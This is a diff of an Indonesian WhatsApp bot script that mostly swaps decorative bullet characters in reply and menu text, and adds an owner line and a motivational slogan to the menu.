@@ -777,11 +777,11 @@ Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
             break
 	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
 	    if (!isCreator) return
-                jobotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➣ 13k Per Group via E-Walet 1 Month\n│➣ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➣ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6281364111257 (Owner)\n\nDonate For Me : \n\n│➣ Paypal : https://www.paypal.me/Cakhaho\n│➣ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
+                jobotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/eeaf2fac29390c8e85181.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n││᭄⃟ꪶ⃟•╾ 13k Per Group via E-Walet 1 Month\n││᭄⃟ꪶ⃟•╾ 18k via pulsa 1 Month\n\n Premium Price Bot\n││᭄⃟ꪶ⃟•╾ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6281364111257 (Owner)\n\nDonate For Me : \n\n││᭄⃟ꪶ⃟•╾ Paypal : https://www.paypal.me/Cakhaho\n││᭄⃟ꪶ⃟•╾ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
             }
             break
 case 'sc': case 'script': {
-m.reply(`╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\n┃╭┈─────────────⩵꙰ཱི࿐\n┃╰── ⏤͟͟͞Script Bot ──➤ ↶↷\n╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\n╭━━•›\n│➣ Subscribe Channel\n│➣ IKYY MAKERZ\n│➣ https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ\n╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\napt update && apt upgrade\napt install git -y\napt install nodejs -y\napt install ffmpeg -y\ngit clone https://github.com/IkyyMakerzz/iky-privatemaster\ncd iky-privatemaster\npkg install yarn\nyarn\nnpm install\npkg install mc\nmc\nhapus session nya\nnode .`)
+m.reply(`╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\n┃╭┈─────────────⩵꙰ཱི࿐\n┃╰── ⏤͟͟͞Script Bot ──➤ ↶↷\n╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\n╭━━•›\n││᭄⃟ꪶ⃟•╾ Subscribe Channel\n││᭄⃟ꪶ⃟•╾ IKYY MAKERZ\n││᭄⃟ꪶ⃟•╾ https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ\n╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\napt update && apt upgrade\napt install git -y\napt install nodejs -y\napt install ffmpeg -y\ngit clone https://github.com/IkyyMakerzz/iky-privatemaster\ncd iky-privatemaster\npkg install yarn\nyarn\nnpm install\npkg install mc\nmc\nhapus session nya\nnode .`)
             }        
             break
 
@@ -1052,7 +1052,7 @@ break
                if (!text) throw `Example : ${prefix + command} packname|author`
           global.packname = text.split("|")[0]
           global.author = text.split("|")[1]
-          m.reply(`Exif berhasil diubah menjadi\n\n│➣ Packname : ${global.packname}\n│➣ Author : ${global.author}`)
+          m.reply(`Exif berhasil diubah menjadi\n\n││᭄⃟ꪶ⃟•╾ Packname : ${global.packname}\n││᭄⃟ꪶ⃟•╾ Author : ${global.author}`)
             }
             break
 	case 'kick': {
@@ -1150,7 +1150,7 @@ break
 let teks = `══✪〘 👥 Tag All 〙✪══
 •━══〘тнєιкувσтz〙══━• \nINFO: ${q ? q : 'kosong'}\n•━══〘тнєιкувσтz〙══━• \n`
                 for (let mem of participants) {
-                teks += `╭━═════════════━• \n│➣ @${mem.id.split('@')[0]}\n╰━═════════════━•\n•━══〘Iιкувσтz〙══━• `
+                teks += `╭━═════════════━• \n││᭄⃟ꪶ⃟•╾ @${mem.id.split('@')[0]}\n╰━═════════════━•\n•━══〘Iιкувσтz〙══━• `
                 }
                 jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                 }
@@ -1169,7 +1169,7 @@ let teks = `══✪〘 👥 Tag All 〙✪══
                 let anu = await styletext(text)
                 let teks = `Srtle Text From ${text}\n\n`
                 for (let i of anu) {
-                    teks += `│➣ *${i.name}* : ${i.result}\n\n`
+                    teks += `││᭄⃟ꪶ⃟•╾ *${i.name}* : ${i.result}\n\n`
                 }
                 m.reply(teks)
 	    }
@@ -1563,8 +1563,8 @@ break
                     let read = i.readTimestamp
                     let unread = i.receiptTimestamp
                     let waktu = read ? read : unread
-                    teks += `│➣ @${i.userJid.split('@')[0]}\n`
-                    teks += ` ┗━│➣ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │➣ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
+                    teks += `││᭄⃟ꪶ⃟•╾ @${i.userJid.split('@')[0]}\n`
+                    teks += ` ┗━││᭄⃟ꪶ⃟•╾ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ││᭄⃟ꪶ⃟•╾ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                 }
                 jobotz.sendTextWithMentions(m.chat, teks, m)
             }
@@ -1599,7 +1599,7 @@ break
              case 'listonline': case 'liston': {
                     let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                     let online = [...Object.keys(store.presences[id]), botNumber]
-                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➣ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
+                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '││᭄⃟ꪶ⃟•╾ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break
             case 'sticker': case 's': case 'stickergif': case 'sgif': {
@@ -2550,7 +2550,7 @@ break
                 if (!text) throw 'Masukkan Query Link!'
                 m.reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
-                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➣ Title : ${anu.result.title}`}, { quoted: m })
+                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `││᭄⃟ꪶ⃟•╾ Title : ${anu.result.title}`}, { quoted: m })
             }
             break
 	        case 'pindl': case 'pinterestdl': {
@@ -2574,11 +2574,11 @@ break
 		    let buttonMessage = {
 		        image: { url: anu.author.profilePic },
 			caption: `
-│➣ Title : ${anu.title}
-│➣ Author : ${anu.author.name}
-│➣ Like : ${anu.like}
-│➣ Caption : ${anu.caption}
-│➣ Url : ${anu.media[0]}
+││᭄⃟ꪶ⃟•╾ Title : ${anu.title}
+││᭄⃟ꪶ⃟•╾ Author : ${anu.author.name}
+││᭄⃟ꪶ⃟•╾ Like : ${anu.like}
+││᭄⃟ꪶ⃟•╾ Caption : ${anu.caption}
+││᭄⃟ꪶ⃟•╾ Url : ${anu.media[0]}
 Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
 `,
 			footer: jobotz.user.name,
@@ -2588,7 +2588,7 @@ Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan c
 		    jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
 		} else if (anu.type == 'image') {
 		    anu.media.map(async (url) => {
-		        jobotz.sendMessage(m.chat, { image: { url }, caption: `│➣ Title : ${anu.title}\n│➣ Author : ${anu.author.name}\n│➣ Like : ${anu.like}\n│➣ Caption : ${anu.caption}` }, { quoted: m })
+		        jobotz.sendMessage(m.chat, { image: { url }, caption: `││᭄⃟ꪶ⃟•╾ Title : ${anu.title}\n││᭄⃟ꪶ⃟•╾ Author : ${anu.author.name}\n││᭄⃟ꪶ⃟•╾ Like : ${anu.like}\n││᭄⃟ꪶ⃟•╾ Caption : ${anu.caption}` }, { quoted: m })
 		    })
 		}
 	    }
@@ -3017,12 +3017,12 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             if (!isCreator) return
             if (!text) throw `Example : ${prefix + command} clash of clans`
             let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
-            let teks = `│➣ Playstore Search From : ${text}\n\n`
+            let teks = `││᭄⃟ꪶ⃟•╾ Playstore Search From : ${text}\n\n`
             for (let i of res.result) {
-            teks += `│➣ Name : ${i.name}\n`
-            teks += `│➣ Link : ${i.link}\n`
-            teks += `│➣ Developer : ${i.developer}\n`
-            teks += `│➣ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
+            teks += `││᭄⃟ꪶ⃟•╾ Name : ${i.name}\n`
+            teks += `││᭄⃟ꪶ⃟•╾ Link : ${i.link}\n`
+            teks += `││᭄⃟ꪶ⃟•╾ Developer : ${i.developer}\n`
+            teks += `││᭄⃟ꪶ⃟•╾ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
             }
             m.reply(teks)
             }
@@ -3032,20 +3032,20 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             if (!text) throw `Example : ${prefix + command} samsung`
             let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
             let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
-let capt = `│➣ Title: ${judul}
-│➣ Realease: ${rilis}
-│➣ Size: ${ukuran}
-│➣ Type: ${type}
-│➣ Storage: ${storage}
-│➣ Display: ${display}
-│➣ Inchi: ${inchi}
-│➣ Pixel: ${pixel}
-│➣ Video Pixel: ${videoPixel}
-│➣ Ram: ${ram}
-│➣ Chipset: ${chipset}
-│➣ Battery: ${batrai}
-│➣ Battery Brand: ${merek_batre}
-│➣ Detail: ${detail}`
+let capt = `││᭄⃟ꪶ⃟•╾ Title: ${judul}
+││᭄⃟ꪶ⃟•╾ Realease: ${rilis}
+││᭄⃟ꪶ⃟•╾ Size: ${ukuran}
+││᭄⃟ꪶ⃟•╾ Type: ${type}
+││᭄⃟ꪶ⃟•╾ Storage: ${storage}
+││᭄⃟ꪶ⃟•╾ Display: ${display}
+││᭄⃟ꪶ⃟•╾ Inchi: ${inchi}
+││᭄⃟ꪶ⃟•╾ Pixel: ${pixel}
+││᭄⃟ꪶ⃟•╾ Video Pixel: ${videoPixel}
+││᭄⃟ꪶ⃟•╾ Ram: ${ram}
+││᭄⃟ꪶ⃟•╾ Chipset: ${chipset}
+││᭄⃟ꪶ⃟•╾ Battery: ${batrai}
+││᭄⃟ꪶ⃟•╾ Battery Brand: ${merek_batre}
+││᭄⃟ꪶ⃟•╾ Detail: ${detail}`
             jobotz.sendImage(m.chat, thumb, capt, m)
             }
             break
@@ -3055,9 +3055,9 @@ let capt = `│➣ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
             let capt = `Jadwal Bioskop From : ${text}\n\n`
             for (let i of res.result){
-            capt += `│➣ Title: ${i.title}\n`
-            capt += `│➣ Thumbnail: ${i.thumb}\n`
-            capt += `│➣ Url: ${i.url}\n\n──────────────────────\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Title: ${i.title}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Thumbnail: ${i.thumb}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, res.result[0].thumb, capt, m)
             }
@@ -3067,9 +3067,9 @@ let capt = `│➣ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
             let capt = `Now Playing Bioskop\n\n`
             for (let i of res.result){
-            capt += `│➣ Title: ${i.title}\n`
-            capt += `│➣ Url: ${i.url}\n`
-            capt += `│➣ Img Url: ${i.img}\n\n──────────────────────\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Title: ${i.title}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Img Url: ${i.img}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, res.result[0].img, capt, m)
             }
@@ -3080,11 +3080,11 @@ let capt = `│➣ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
             let capt = `Amino Search From : ${text}\n\n`
             for (let i of res.result){
-            capt += `│➣ Community: ${i.community}\n`
-            capt += `│➣ Community Link: ${i.community_link}\n`
-            capt += `│➣ Thumbnail: ${i.community_thumb}\n`
-            capt += `│➣ Description: ${i.community_desc}\n`
-            capt += `│➣ Member Count: ${i.member_count}\n\n──────────────────────\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Community: ${i.community}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Community Link: ${i.community_link}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Thumbnail: ${i.community_thumb}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Description: ${i.community_desc}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Member Count: ${i.member_count}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
             }
@@ -3095,13 +3095,13 @@ let capt = `│➣ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
             let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
             let capt = `Wattpad From ${text}\n\n`
-            capt += `│➣ Judul: ${judul}\n`
-            capt += `│➣ Dibaca: ${dibaca}\n`
-            capt += `│➣ Divote: ${divote}\n`
-            capt += `│➣ Bab: ${bab}\n`
-            capt += `│➣ Waktu: ${waktu}\n`
-            capt += `│➣ Url: ${url}\n`
-            capt += `│➣ Deskripsi: ${description}`
+            capt += `││᭄⃟ꪶ⃟•╾ Judul: ${judul}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Dibaca: ${dibaca}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Divote: ${divote}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Bab: ${bab}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Waktu: ${waktu}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Url: ${url}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Deskripsi: ${description}`
             jobotz.sendImage(m.chat, thumb, capt, m)
             }
             break
@@ -3110,11 +3110,11 @@ let capt = `│➣ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
             let capt = `Webtoons Search From : ${text}\n\n`
             for (let i of res.result) {
-            capt += `│➣ Judul: ${i.judul}\n`
-            capt += `│➣ Like: ${i.like}\n`
-            capt += `│➣ Creator: ${i.creator}\n`
-            capt += `│➣ Genre: ${i.genre}\n`
-            capt += `│➣ Url: ${i.url}\n\n──────────────────────\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Judul: ${i.judul}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Like: ${i.like}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Creator: ${i.creator}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Genre: ${i.genre}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n\n──────────────────────\n`
             }
             m.reply(capt)
             }
@@ -3125,11 +3125,11 @@ let capt = `│➣ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
             let capt = `Drakor Search From : ${text}\n\n`
             for (let i of res.result) {
-            capt += `│➣ Judul: ${i.judul}\n`
-            capt += `│➣ Years: ${i.years}\n`
-            capt += `│➣ Genre: ${i.genre}\n`
-            capt += `│➣ Url: ${i.url}\n`
-            capt += `│➣ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Judul: ${i.judul}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Years: ${i.years}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Genre: ${i.genre}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n`
+            capt += `││᭄⃟ꪶ⃟•╾ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
             }
@@ -3190,6 +3190,7 @@ jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky.mp3'), mimetype: '
 ▰▱▰▱▰▱▰▱▰▱▰▱▰
 ╭─────────────────╮
 │      ◪〘 MENU BOT 〙◪
+│  OWNER : ${ownername}
 ╰─────────────────╮
 ╭─────────────────╯
 ├⊱❏ BUGIKY ( fitur khusus owner!! ) 
@@ -3214,6 +3215,8 @@ jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky.mp3'), mimetype: '
 │⊱❏ EXTRAFITURBYIKY
 ╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰
+[🇮🇩]𝐁𝐄𝐑𝐏𝐈𝐊𝐈𝐑𝐋𝐀𝐇 𝐏𝐎𝐒𝐈𝐓𝐈𝐅 𝐓𝐈𝐃𝐀𝐊 𝐏𝐄𝐃𝐔𝐋𝐈 𝐒𝐄𝐁𝐄𝐑𝐀𝐏𝐀 𝐊𝐄𝐑𝐀𝐒 𝐊𝐄𝐇𝐈𝐃𝐔𝐏𝐀𝐍 𝐌𝐔
+-𝐈𝐊𝐘𝐌𝐀𝐊𝐄𝐑𝐙
 
 © ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
 `
@@ -3449,327 +3452,327 @@ break
 │    ◪〘 GRUP MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
-│➣ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
-│➣ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
-│➣ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
-│➣ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
-│➣ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
-│➣ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
-│➣ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘WEBZONE MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
-│➣ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
-│➣ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➣ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➣ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
-│➣ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
-│➣ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
-│➣ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
 ╰─────────────────╮
 ╭─────────────────╯
 │〘DOWNLOAD MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
 ╰─────────────────╮
 ╭─────────────────╯
